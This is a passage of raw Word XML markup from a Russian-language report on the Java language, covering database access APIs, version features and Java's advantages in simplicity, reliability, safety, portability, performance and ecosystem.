            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>SQL</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-запросов — на основе </w:t>
      </w:r>
      <w:hyperlink r:id="rId18" w:tooltip="JDBC" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>JDBC</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId19" w:tooltip="SQLJ" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>SQLJ</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1104"/>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 уровне концепции объектов, обладающих способностью к хранению в базе данных — на основе </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> HYPERLINK "https://ru.wikipedia.org/w/index.php?title=Java_Data_Objects&amp;action=edit&amp;redlink=1" \o "Java Data Objects (страница отсутствует)" </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>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Data</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Objects</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t> (</w:t>
      </w:r>
      <w:hyperlink r:id="rId20" w:tooltip="en:Java Data Objects" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>англ.</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>) и </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> HYPERLINK "https://ru.wikipedia.org/wiki/Java_Persistence_API" \o "Java Persistence API" </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>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Persistence</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> API</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="76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Поддержка обобщений (начиная с версии 1.5).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="76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Поддержка лямбд, замыканий, встроенные возможности функционального программирования (с 1.8).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DD2596" w:rsidRDefault="00DD2596" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>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lastRenderedPageBreak/>
        <w:t>Примеры программ</w:t>
      </w:r>
      <w:r w:rsidR="00DD2596">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> на рисунке (1.1)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-RU"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7DC3E8F8" wp14:editId="5FCD779D">
            <wp:extent cx="3629025" cy="13144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025" cy="1314450"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00DD2596" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="708" w:firstLine="708"/>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w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00BA3D32"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1.5 Преимущества и недостатки</w:t>
      </w:r>
      <w:r w:rsidR="00DD2596">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DD2596">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00073DDF" w:rsidRDefault="005E2C4B" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00BA3D32" w:rsidRDefault="00BA3D32" w:rsidP="00DD2596">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w:t>
      </w:r>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>реимуществ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>а</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00BA3D32" w:rsidRDefault="00BA3D32" w:rsidP="00BA3D32">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1.</w:t>
      </w:r>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00BA3D32">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Простота</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Синтаксис языка был унаследован от C++. Сегодня на фоне </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Python</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Groove</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Go</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> его трудно назвать простым, однако тогда эволюционный вид позволил привлечь внимание Си-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>разработчиков.Такая</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> форма конструкций не увеличивает скорость набора, однако читать, понимать и воспроизводить его просто.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00BA3D32" w:rsidP="00DD2596">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2.</w:t>
      </w:r>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Надёжность</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>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Надёжность обеспечивается двумя принципами:</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ООП. Иерархия наследования увеличивает читаемость кода и снижает количество невынужденных </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ошибок.Строгая</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> типизация. Разработчику приходится выполнять больший объём работы, но данные интерпретируется однозначно.</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Кроме того, первоначально в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предполагался запрет прямого доступа к памяти, что также повышало бы надёжность. Но разработчики оставили несколько лазеек, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>например</w:t>
      </w:r>
      <w:proofErr w:type="gram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бэкдор</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sun.misc.Unsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, которые этот запрет обходят.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00CD4D49" w:rsidP="00DD2596">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3.</w:t>
      </w:r>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Безопасность</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Кроме сохранения общей формы конструкций,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по сравнению с C++ формально лишился двух потенциальных опасностей: указателей и множественного наследования. На деле обе функции сохранены, но представлены в ином виде: вместо указателей используются значения, а в множественном наследовании участвуют не классы, а интерфейсы. Тем не менее, такая особенность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программирования почти исключает возможный урон от невнимательности разработчика.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00CD4D49" w:rsidP="00DD2596">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073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Удобство</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Дословно концепция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звучит как: «</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Write</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once</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run</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anywhere</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">». То есть </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>исполняемость</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> кода не зависит от используемой операционной системы или установленного ПО. Достигается это благодаря транслированию в байт-код виртуальной машиной JVM.</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Как нельзя кстати пригодилась эта особенность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на </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>android</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. Разнообразие производителей, моделей телефонов, характеристик — всё это могло бы негативно сказаться на работе приложений, если бы не существование такого универсального инструмента.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00CD4D49" w:rsidP="00DD2596">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073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Производительность</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Особенность </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, связанная с транслированием в байт-код, положительно сказывается и на производительности конечных продуктов. По скорости исполнения однотипные программы на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уступают в 1,5-2 раза программам на C/C++, при этом превосходят </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>JavaScript</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Ruby</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Python</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">.   </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>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Развитая экосистема</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За 22 года жизни язык оброс десятками IDE и </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
